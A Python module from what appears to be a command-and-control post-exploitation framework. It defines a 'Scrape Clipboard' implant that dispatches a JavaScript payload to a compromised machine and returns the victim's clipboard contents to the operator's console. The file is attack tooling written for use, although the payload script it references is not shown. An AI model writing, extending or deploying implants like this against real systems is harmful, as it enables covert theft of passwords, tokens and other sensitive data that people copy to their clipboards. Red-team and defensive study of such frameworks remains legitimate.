import core.job
import core.implant
import uuid

class ClipboardJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain("Clipboard contents:")
        self.shell.print_plain(self.data)
        self.results = self.data

class ClipboardImplant(core.implant.Implant):

    NAME = "Scrape Clipboard"
    DESCRIPTION = "Gets the contents of the clipboard"
    AUTHORS = ["RiskSense, Inc."]
    STATE = "implant/gather/clipboard"

    def load(self):
        pass

    def job(self):
        return ClipboardJob

    def run(self):
        payloads = {}
        payloads["js"] = "data/implant/gather/clipboard.js"
        self.dispatch(payloads, self.job)
